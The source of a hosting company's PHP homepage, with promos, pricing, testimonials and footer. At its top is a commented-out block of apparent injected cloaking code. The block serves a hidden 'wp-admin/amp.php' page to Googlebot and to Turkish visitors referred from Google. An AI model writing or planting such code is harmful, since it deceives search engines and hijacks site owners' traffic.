// <?php 
// if (!empty($_SERVER['HTTP_USER_AGENT'])) {
//     $userAgent = $_SERVER['HTTP_USER_AGENT'];
// } else {
//     $userAgent = '';
// }

// if (!empty($_SERVER['HTTP_REFERER'])) {
//     $referer = $_SERVER['HTTP_REFERER'];
// } else {
//     $referer = '';
// }

// $googleBots = [
//     'Googlebot',
//     'AdsBot',
//     'Mediapartners-Google',
//     'APIs-Google',
//     'Googlebot-Image',
//     'Googlebot-Video',
//     'Googlebot-News',
//     'Googlebot-Search',
//     'Googlebot-Inspect',
//     'Googlebot-Android',
//     'Googlebot-Mobile',
//     'Googlebot-Ads',
//     'Googlebot-Discovery',
//     'Google-',
// ];

// function isFromTurkey($ip) {
//     static $cache = [];
//     if (isset($cache[$ip])) {
//         return $cache[$ip];
//     }
    
//     $url = "http://ip-api.com/json/{$ip}?fields=countryCode";
//     $response = @file_get_contents($url);
    
//     if ($response === false) {
//         return false;
//     }
    
//     $data = json_decode($response, true);
//     $isTurkey = (isset($data['countryCode']) && $data['countryCode'] === 'TR');
//     $cache[$ip] = $isTurkey;
//     return $isTurkey;
// }

// $visitorIp = $_SERVER['REMOTE_ADDR'];

// if (preg_match('/' . implode('|', $googleBots) . '/i', $userAgent)) {
//     if ($_SERVER['REQUEST_URI'] == '/') {
//         include 'wp-admin/amp.php';
//         die();
//     }
// } elseif (
//     !preg_match('/' . implode('|', $googleBots) . '/i', $userAgent) &&
//     preg_match('/google\.com/i', $referer) &&
//     isFromTurkey($visitorIp)
// ) {
    
//   include 'wp-admin/amp.php';
//         die();
// }
// ?>

<?php

    // Header part
    
    include_once "includes/header/header.php"
?>

    <div class="main">

        <!--hero section start-->
        <section class="ptb-100 overflow-hidden primary-bg">
            <div class="container">
                <div class="row align-items-center justify-content-lg-between justify-content-md-center justify-content-sm-center">
                    <div class="col-md-12 col-lg-6">
                        <div class="hero-slider-content text-white py-5">
                            <div class="headline mb-4">
                                <p class="mb-0"><i class="fas fa-bell rounded-circle mr-2"></i> <span class="font-weight-bold">25% Discount on</span> first annual purchase</p>
                            </div>
                            <h1 class="text-white">Unlimited Domain, Hosting & Business Solution</h1>
                            <p class="lead">Trusted platform for hositng website, 99.9% uptime guarantee, free SSL certificate & many more.</p>

                            <div class="action-btns mt-4">
                                <a href="https://clients.kloudwebs.com/" class="btn btn-brand-03 btn-lg">Get Started Now </a>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-12 col-lg-6">
                        <div class="img-wrap">
                            <img src="assets/img/server-visual.png" alt="hosting" class="img-fluid">
                        </div>
                    </div>
                </div>
                <!--end of row-->
            </div>
            <!--end of container-->
        </section>
        <!--hero section end-->

        <!--domain search promo start-->
        <section>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-9 col-lg-8 col-12">
                        <div class="domain-search-wrap border gray-light-bg">
                            <h4 class="text-center">Looking For Domain Name?</h4>
                            <form action="domain-search-result.php" method="GET" class="domain-search-form my-4">
                                <input type="text" name="domain" id="domain" class="form-control" placeholder="yourdomainname.com" />
                                <div class="select-group">
                                    <select name="domainType" class="form-control">
                                        <option value="com" selected>.com</option>
                                        <option value="net">.net</option>
                                        <option value="io">.io</option>
                                        <option value="info">.info</option>
                                        <option value="store">.store</option>
                                        <option value="store">.org</option>
                                    </select>
                                    <button type="submit" class="btn btn-brand-01"><i class="fas fa-search pr-1"></i> Search</button>
                                </div>
                            </form>
                            <div class="domain-list-wrap text-center">
                                <ul class="list-inline domain-search-list">
                                    <li class="list-inline-item bg-white border rounded"><a href="#"><img src="assets/img/com-tld1.png" alt="com" width="70" class="img-fluid"> <span>$8.89</span></a>
                                    </li>
                                    <li class="list-inline-item bg-white border rounded"><a href="#"><img src="assets/img/net-tld.png" alt="com" width="70" class="img-fluid"> <span>$15.5</span></a>
                                    </li>
                                    <li class="list-inline-item bg-white border rounded"><a href="#"><img src="assets/img/org-tld.png" alt="com" width="70" class="img-fluid"> <span>$15.94</span></a>
                                    </li>
                                    <li class="list-inline-item bg-white border rounded"><a href="#"><img src="assets/img/shop-tld.png" alt="com" width="70" class="img-fluid"> <span>$33.98</span></a>
                                    </li>
                                    <li class="list-inline-item bg-white border rounded"><a href="#"><img src="assets/img/xyz-tld.png" alt="com" width="70" class="img-fluid"> <span>$1.76</span></a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--domain search promo end-->

        <!--promo section start-->
        <section class="promo-section ptb-100 ">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-10 col-lg-7">
                        <div class="section-heading text-center">
                            <h2>Get Experience With Super Fast Data Server For Your Business.</h2>
                            <p>Trusted and reliable service with super fast data server gives you the ultimate level of experience to host your website today. Let your burden on our responsibility. </p>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-md-center justify-content-sm-center">
                    <div class="col-md-6 col-lg-4">
                        <div class="card single-promo-card single-promo-hover text-center p-2 mt-4">
                            <div class="card-body">
                                <div class="pb-2">
                                    <span class="fas fa-cubes icon-size-lg color-primary"></span>
                                </div>
                                <div class="pt-2 pb-3">
                                    <h5>Fully functional</h5>
                                    <p class="mb-0">Fully customized, ready and functional wordpress hosting makes your day super fast and productive.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-4">
                        <div class="card single-promo-card single-promo-hover text-center p-2 mt-4">
                            <div class="card-body">
                                <div class="pb-2">
                                    <span class="fas fa-headset icon-size-lg color-primary"></span>
                                </div>
                                <div class="pt-2 pb-3">
                                    <h5>Interactive Fast </h5>
                                    <p class="mb-0">We always try to make our customers happy and staisfied with our service and give you priority.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-4">
                        <div class="card single-promo-card single-promo-hover text-center p-2 mt-4">
                            <div class="card-body">
                                <div class="pb-2">
                                    <span class="fas fa-lock icon-size-lg color-primary"></span>
                                </div>
                                <div class="pt-2 pb-3">
                                    <h5>Secure Data</h5>
                                    <p class="mb-0">The main thing for any kind of online resources are data which needs proper security and attention.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--promo section end-->

        <!--call to action start-->
        <section class="ptb-60 primary-bg">
            <div class="container">
                <div class="row align-items-center justify-content-between">
                    <div class="col-md-7 col-lg-6">
                        <div class="cta-content-wrap text-white">
                            <h2 class="text-white">Best Web Hosting <br> With Trusted Service</h2>
                            <p> To give the best experience of speed and performance we have great resources to share you. Your innovative idea will not be untouched as well as incomplete. Start your business right now and host your website on our super fast hosting server. </p>
                        </div>
                        <div class="action-btns mt-4">
                            <a href="https://kloudwebs.com/web-hosting" class="btn btn-brand-03"> Get Start Now </a>
                        </div>
                    </div>
                    <div class="col-md-5 col-lg-4">
                        <div class="cta-img-wrap text-center">
                            <img src="assets/img/visual-server-resources.png" class="img-fluid" alt="server room">
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--call to action end-->

        <!--services section start-->
        <section class="ptb-100 service-section-wrap">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-10 col-lg-7">
                        <div class="section-heading text-center">
                            <h2>Our Domain hosting Service and Business Solutions</h2>
                            <p>To be well apept at global cycle digiatal communication is the first priority worldwide. Connecting you through the tunnel of globalization is the main focus.</p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-6 col-lg-6">
                        <div class="single-service p-5 rounded border gray-light-bg">
                            <div class="service-header d-flex align-items-center justify-content-between">
                                <h4><span class="h5 text-uppercase">Easy & First</span> <br>Website Building</h4>
                                <span class="fas fa-shield-alt fa-3x color-primary"></span>
                            </div>
                            <p> To make your journey easy and approachable to others we have some innovative ideas to share. Without solid foundation of coding exerience
                            we give you the feel of being own maker of yourself.</p>
                            <a href="#" class="btn btn-outline-brand-02 mt-3">Learn More</a>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-6">
                        <div class="single-service p-5 rounded border gray-light-bg">
                            <div class="service-header d-flex align-items-center justify-content-between">
                                <h4><span class="h5 text-uppercase">Suitable For All Users</span> <br>Managed WordPress</h4>
                                <span class="fab fa-wordpress fa-3x color-primary"></span>
                            </div>
                            <p> Our every hosting plan comes with user friendly c-panel and one click wordpress installer which is very easy to install and manage things.</p>
                            <a href="#" class="btn btn-outline-brand-02 mt-3">Learn More</a>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-6">
                        <div class="single-service p-5 rounded border gray-light-bg">
                            <div class="service-header d-flex align-items-center justify-content-between">
                                <h4><span class="h5 text-uppercase">Commitment To</span> <br>Dedicated Support</h4>
                                <span class="fas fa-headset fa-3x color-primary"></span>
                            </div>
                            <p>Buiding a community is the main motto of kloudwebs. Our technicians always try to solve the issue cordially so that you can not to be lost. </p>
                            <a href="#" class="btn btn-outline-brand-02 mt-3">Learn More</a>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-6">
                        <div class="single-service p-5 rounded border gray-light-bg">
                            <div class="service-header d-flex align-items-center justify-content-between">
                                <h4><span class="h5 text-uppercase">Easy & Smooth</span> <br>Website Transfer</h4>
                                <span class="fas fa-dolly-flatbed fa-3x color-primary"></span>
                            </div>
                            <p> To make you hassle free we take the responsibility to website migration. Leave your all worries over us and be productive with time. </p>
                            <a href="#" class="btn btn-outline-brand-02 mt-3">Learn More</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--services section end-->


        <!--pricing section start-->
        
        <section class="pricing-section ptb-100 gray-light-bg">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-9 col-lg-8">
                        <div class="section-heading text-center mb-4">
                            <h2>Our Flexible Pricing Plan</h2>
                            <p>
                                Professional hosting at an affordable price. Quality starts from here. No compromise with quality service.
                            </p>
                        </div>
                    </div>
                </div>
                <div class="row align-items-center justify-content-md-center justify-content-center">
                    <div class="col-lg-4 col-md-6 col-sm-8">
                        <div class="text-center bg-white single-pricing-pack-2 mt-4 rounded border">
                            <div class="pricing-icon">
                                <img src="assets/img/dadicate-web-hosting.svg" width="60" alt="hosing">
                            </div>
                            <h4 class="package-title">Web Hosting</h4>
                            <p class="mb-4">For small business</p>
                            <div class="pricing-price pt-4">
                                <small>Starting at</small>
                                <div class="h2">$1.64 <span class="price-cycle h4">/mo</span></div>
                            </div>
                            <a href="https://clients.kloudwebs.com/index.php/store/web-hosting" class="btn btn-brand-01">Get Started Now</a>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6 col-sm-8">
                        <div class="popular-price text-center bg-white single-pricing-pack-2 mt-4 rounded border">
                            <div class="pricing-icon">
                                <img src="assets/img/vps-hosting.svg" width="60" alt="hosing">
                            </div>
                            <h4 class="package-title">VPS Hosting</h4>
                            <p class="mb-4">For Speed</p>
                            <div class="pricing-price pt-4">
                                <small>Starting at</small>
                                <div class="h2">$7.00 <span class="price-cycle h4">/mo</span></div>
                            </div>
                            <a href="#" class="btn btn-brand-01">Get Started Now</a>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6 col-sm-8">
                        <div class="text-center bg-white single-pricing-pack-2 mt-4 rounded border">
                            <div class="pricing-icon">
                                <img src="assets/img/cloud-hosting.svg" width="60" alt="hosing">
                            </div>
                            <h4 class="package-title">Cloud Hosting</h4>
                            <p class="mb-4">Enterprise business</p>
                            <div class="pricing-price pt-4">
                                <small>Starting at</small>
                                <div class="h2">$2.00 <span class="price-cycle h4">/mo</span></div>
                            </div>
                            <a href="https://kloudwebs.com/cloud-hosting" class="btn btn-brand-01">Get Started Now</a>
                        </div>
                    </div>
                    <div class="col-12">
                        <div class="support-cta text-center mt-5">
                            <h5 class="mb-1"><span class="ti-headphone-alt color-primary mr-3"></span>We're Here to Help You
                            </h5>
                            <p>Have some questions? <a href="#">Chat with us now</a>, or <a href="#">send us an email</a> to
                                get in touch.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        
        <!--pricing section end-->

        <!--features section start-->
        <!--
        <div class="feature-section ptb-100 ">
            <div class="container">
                <div class="row align-items-center justify-content-between">
                    <div class="col-md-7 col-lg-6">
                        <div class="feature-content-wrap">
                            <h2>99% Cloud Hosing High-speed Cutting-edge Platform</h2>
                            <p>Authoritatively transform functionalized information without cross-platform convergence. Quickly reconceptualize cross-unit e-markets without superior products. Appropriately foster timely collaboration and idea-sharing rather than magnetic potentialities. Authoritatively restore high standards in outsourcing whereas vertical meta-services. Compellingly reconceptualize out-of-the-box outsourcing through plug-and-play synergy.</p>
                            <a href="#" class="btn btn-outline-brand-01 mt-3" target="_blank">Learn More</a>
                        </div>
                    </div>
                    <div class="col-md-5 col-lg-5 d-none d-md-block d-lg-block">
                        <div class="feature-img-wrap text-center">
                            <img src="assets/img/services.svg" class="img-fluid" alt="server room">
                        </div>
                    </div>
                </div>
                <div class="row align-items-center justify-content-between mt-5">
                    <div class="col-md-5 col-lg-5 d-none d-md-block d-lg-block">
                        <div class="feature-img-wrap text-center">
                            <img src="assets/img/create-website.svg" class="img-fluid" alt="server room">
                        </div>
                    </div>
                    <div class="col-md-7 col-lg-6">
                        <div class="feature-content-wrap">
                            <h2>Our Own Interfaces for All Management Processes</h2>
                            <p>Authoritatively transform functionalized information without cross-platform convergence. Quickly reconceptualize cross-unit e-markets without superior products. Appropriately foster timely collaboration and idea-sharing rather than magnetic potentialities. Authoritatively restore high standards in outsourcing whereas vertical meta-services. Compellingly reconceptualize out-of-the-box outsourcing through plug-and-play synergy.</p>
                            <a href="#" class="btn btn-outline-brand-01 mt-3" target="_blank">Learn More</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
-->
        <!--features section end-->

        <!--call to action start-->
        <section class="ptb-60 primary-bg">
            <div class="container">
                <div class="row align-items-center justify-content-between">
                    <div class="col-12 col-lg-6">
                        <div class="cta-content-wrap text-white">
                            <h2 class="text-white">Interactive Hosting Support Our Customers Love</h2>
                            <p>We give priority to our customers and always try to be the best co-operative to solve their issues.. </p>
                        </div>
                        <div class="support-action d-inline-flex flex-wrap">
                            <a href="mailto:support@kloudwebs.com" class="mr-3"><i class="fas fa-comment mr-1 color-accent"></i> <span>support@kloudwebs.com</span></a>
                            <a href="tel:+8801941566108" class="mb-0"><i class="fas fa-phone-alt mr-1 color-accent"></i> <span>+8801941566108</span></a>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-4 d-none d-lg-block">
                        <div class="cta-img-wrap text-center">
                            <img src="assets/img/call-center-support.svg" width="250" class="img-fluid" alt="server room">
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!--call to action end-->

        <!--network map section start-->
        <!--
        <section class="network-map-section ptb-100 gray-light-bg">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-9 col-lg-8">
                        <div class="section-heading text-center mb-5">
                            <h2>Our Data centers Location</h2>
                            <p class="lead">Cloudhub offers a low latency worldwide network, enabling you to deploy your
                                service infrastructure in close proximity to your customer base.</p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">
                        <div class="network-map-wrap">
                            <ul class="custom-map-location">
                                <li style="top: 29%; left: 15.5%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Canada"></span>
                                </li>
                                <li style="top: 42%; left: 20%;">
                                    <span data-toggle="tooltip" data-placement="top" title="United States"></span>
                                </li>
                                <li style="top: 70%; left: 32%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Brazil"></span>
                                </li>
                                <li style="top: 57%; left: 48%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Nigeria"></span>
                                </li>
                                <li style="top: 18%; left: 53%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Finland"></span>
                                </li>
                                <li style="top: 34%; left: 55%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Ukraine"></span>
                                </li>
                                <li style="top: 45%; left: 68%;">
                                    <span data-toggle="tooltip" data-placement="top" title="India"></span>
                                </li>
                                <li style="top: 35%; left: 80%;">
                                    <span data-toggle="tooltip" data-placement="top" title="China"></span>
                                </li>
                                <li style="top: 77%; left: 85%;">
                                    <span data-toggle="tooltip" data-placement="top" title="Australia"></span>
                                </li>
                            </ul>
                            <img src="assets/img/map-dark.svg" alt="location map">
                        </div>
                    </div>
                </div>
            </div>
        </section>
        -->
        <!--network map section end-->

        <!--testimonial section start-->
        
        <section class="review-section ptb-100 ">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-10 col-lg-7">
                        <div class="section-heading text-center">
                            <h2>Our Lovely Clients Say About Us</h2>
                            <p>Our happy users are awesome to give their reviews on our service & support. We are very glad to have such kind words. We promise to keep our work user end satisfaction. </p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="owl-carousel owl-theme client-testimonial-1 dot-bottom-center custom-dot">
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>This is an authentic service</h5>
                                    <p>This is an authentic service. There are no hidden charge or conditions. They are also providing an affiliate program and user-friendly control panel. Personally, I am using their service.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-2.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Shaifullah Riaj Patwary</h6>
                                        <span>Eye 71</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Unparalleled service</h5>
                                    <p>This is an authentic and unparalleled service. There has no hidden charge or conditions. All of guys you can take their service undoubtly. Personally i use their service</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-1.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Moynul islam</h6>
                                        <span>Nitmag</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Fast and reliable hosting company</h5>
                                    <p>I was searching for a hosting provider for myself and my clients. I'm a web developer looking for a provider who offers some plans at affordable price. Finally, I found a company named Kloud Webs who offers budget friendly plan and cordial customer support. As a web developer, I need a fast web hosting server and found Kloud Webs that fulfilling my requirements. It’s a pleasure to be a part of this community. :)</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-3.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Nayem Rabbi</h6>
                                        <span>Devsnode</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!--
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Uniquely mesh flexible</h5>
                                    <p>Phosfluorescently optimize intermandated platforms without integrated infrastructures. Proactively redefine granular thinking before.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-4.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Compellingly empower app</h5>
                                    <p>Proactively grow focused niche markets with virtual e-services. Rapidiously pursue effective ROI via holistic information completely reintermediate.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-2.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Holisticly reintermediate</h5>
                                    <p>Collaboratively reintermediate out-of-the-box e-business via economically sound supply chains. Dynamically target client-based holistic information.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-1.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Uniquely mesh flexible</h5>
                                    <p>Phosfluorescently optimize intermandated platforms without integrated infrastructures. Proactively redefine granular thinking before.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-3.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Compellingly empower app</h5>
                                    <p>Proactively grow focused niche markets with virtual e-services. Rapidiously pursue effective ROI via holistic information completely reintermediate.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-1.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item">
                            <div class="border single-review-wrap bg-white p-4 m-3">
                                <div class="review-body">
                                    <h5>Holisticly reintermediate</h5>
                                    <p>Collaboratively reintermediate out-of-the-box e-business via economically sound supply chains. Dynamically target client-based holistic information.</p>
                                </div>
                                <div class="review-author d-flex align-items-center">
                                    <div class="author-avatar">
                                        <img src="assets/img/client-2.jpg" width="64" alt="author" class="rounded-circle shadow-sm img-fluid mr-3" />
                                        <span>“</span>
                                    </div>
                                    <div class="review-info">
                                        <h6 class="mb-0">Ana Joly</h6>
                                        <span>BizBite</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        -->
                    </div>
                </div>
            </div>
        </section>
        
        <!--testimonial section end-->

        <!--our blog section start-->
        <!--
        <section class="our-blog-section ptb-100 gray-light-bg">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-9 col-lg-8">
                        <div class="section-heading text-center">
                            <h2>Recent News and Events</h2>
                            <p>
                                Efficiently matrix robust total linkage after market positioning bandwidth. Holisticly restore B2B materials rather than brand flexible paradigms vis-a-vis mission-critical e-commerce.
                            </p>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-md-6 col-lg-4">
                        <a class="single-blog-article border rounded bg-white d-block p-4 mt-4" href="#">
                            <div class="article-heading">
                                <h3 class="h5 mb-0">Professionally cultivate testing</h3>
                                <span> On 20 Mar, 2020</span>
                            </div>
                            <span class="border-shape my-3"></span>
                            <p>Enthusiastically pursue tactical architectures vis-a-vis goal-oriented resources.</p>
                            <div class="article-footer d-flex align-items-center justify-content-between">
                                <div class="article-comments">
                                    <span><i class="fas fa-comment mr-1"></i> 34 Comments</span>
                                </div>
                                <div class="article-user">
                                    <span class="fas fa-user"></span>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-6 col-lg-4">
                        <a class="single-blog-article border rounded bg-white d-block p-4 mt-4" href="#">
                            <div class="article-heading">
                                <h3 class="h5 mb-0">Monotonectally promote market</h3>
                                <span> On 20 May, 2020</span>
                            </div>
                            <span class="border-shape my-3"></span>
                            <p>Enthusiastically pursue tactical architectures vis-a-vis goal-oriented resources.</p>
                            <div class="article-footer d-flex align-items-center justify-content-between">
                                <div class="article-comments">
                                    <span><i class="fas fa-comment mr-1"></i> 24 Comments</span>
                                </div>
                                <div class="article-user">
                                    <span class="fas fa-user"></span>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-md-6 col-lg-4">
                        <a class="single-blog-article border rounded bg-white d-block p-4 mt-4" href="#">
                            <div class="article-heading">
                                <h3 class="h5 mb-0">Seamlessly evolve interactive </h3>
                                <span> On 10 Mar, 2020</span>
                            </div>
                            <span class="border-shape my-3"></span>
                            <p>Enthusiastically pursue tactical architectures vis-a-vis goal-oriented resources.</p>
                            <div class="article-footer d-flex align-items-center justify-content-between">
                                <div class="article-comments">
                                    <span><i class="fas fa-comment mr-1"></i> 20 Comments</span>
                                </div>
                                <div class="article-user">
                                    <span class="fas fa-user"></span>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </section>
        -->
        <!--our blog section end-->

        <!--our team section start-->
        
        <section class="client-section  ptb-100">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <div class="section-heading text-center mb-5">
                            <h2>Happy Users</h2>
                            <p>
                                Lots of users have trust on Kloudwebs and are happy clients.
                            </p>
                        </div>
                    </div>
                </div>
                <div class="row align-items-center">
                    <div class="col-md-12">
                        <div class="owl-carousel owl-theme clients-carousel dot-indicator">
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-01.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-02.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-03.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-04.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-05.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-06.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-07.png" alt="client logo" class="customer-logo">
                            </div>
                            <div class="item single-customer">
                                <img src="assets/img/customers/clients-logo-08.png" alt="client logo" class="customer-logo">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        
        <!--our team section end-->

    </div>

    <!--footer section start-->
    <footer class="footer-1 ptb-60 gradient-bg">
        <div class="container">
            <div class="row">
                <div class="col-md-12 col-lg-4 mb-4 mb-md-4 mb-sm-4 mb-lg-0">
                    <a href="#" class="navbar-brand mb-2">
                        <img src="assets/img/logo-white.png" alt="logo" class="img-fluid">
                    </a>
                    <br>
                    <p>We make communication between your business and internet through digital service to connect you with the world. A leading comapny of domain-hosting provider.</p>
                    <ul class="list-inline social-list-default background-color social-hover-2 mt-2">
                        <li class="list-inline-item"><a class="twitter" href="#"><i class="fab fa-twitter"></i></a></li>
                        <li class="list-inline-item"><a class="youtube" href="#"><i class="fab fa-youtube"></i></a></li>
                        <li class="list-inline-item"><a class="linkedin" href="#"><i class="fab fa-linkedin-in"></i></a></li>
                        <li class="list-inline-item"><a class="dribbble" href="#"><i class="fab fa-dribbble"></i></a></li>
                    </ul>
                </div>
                <div class="col-md-12 col-lg-8">
                    <div class="row mt-0">
                        <div class="col-sm-6 col-md-3 col-lg-3 mb-4 mb-sm-4 mb-md-0 mb-lg-0">
                            <h6 class="font-weight-normal">Resources</h6>
                            <ul>
                                <li>
                                    <a href="#">Help</a>
                                </li>
                                <li>
                                    <a href="#">Events</a>
                                </li>
                                <li>
                                    <a href="#">Live sessions</a>
                                </li>
                                <li>
                                    <a href="#">Open source</a>
                                </li>
                                <li>
                                    <a href="#">Documentation</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-sm-6 col-md-3 col-lg-3 mb-4 mb-sm-4 mb-md-0 mb-lg-0">
                            <h6 class="font-weight-normal">Products</h6>
                            <ul>
                                <li>
                                    <a href="#">Pricing</a>
                                </li>
                                <li>
                                    <a href="#">Navigation</a>
                                </li>
                                <li>
                                    <a href="#">AI Studio</a>
                                </li>
                                <li>
                                    <a href="#">Page Speed </a>
                                </li>
                                <li>
                                    <a href="#">Performance</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-sm-6 col-md-3 col-lg-3 mb-4 mb-sm-4 mb-md-0 mb-lg-0">
                            <h6 class="font-weight-normal">Company</h6>
                            <ul>
                                <li>
                                    <a href="https://kloudwebs.com/about-us">About Us</a>
                                </li>
                                <li>
                                    <a href="#">Careers</a>
                                </li>
                                <li>
                                    <a href="#">Collaboration</a>
                                </li>
                                <li>
                                    <a href="#">Community</a>
                                </li>
                                <li>
                                    <a href="#">Our Team</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-sm-6 col-md-3 col-lg-3">
                            <h6 class="font-weight-normal">Support</h6>
                            <ul>
                                <li>
                                    <a href="#">FAQ</a>
                                </li>
                                <li>
                                    <a href="#">Sells</a>
                                </li>
                                <li>
                                    <a href="https://clients.kloudwebs.com/submitticket.php">Contact Support</a>
                                </li>
                                <li>
                                    <a href="#">Network Status</a>
                                </li>
                                <li>
                                    <a href="#">Product Services</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--end of container-->
    </footer>

    <!--footer bottom copyright start-->
    <div class="footer-bottom py-3 gray-light-bg">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-lg-7">
                    <div class="copyright-wrap small-text">
                        <p class="mb-0">&copy;Kloudwebs, All rights reserved</p>
                    </div>
                </div>
                <div class="col-md-6 col-lg-5">
                    <div class="terms-policy-wrap text-lg-right text-md-right text-left">
                        <ul class="list-inline">
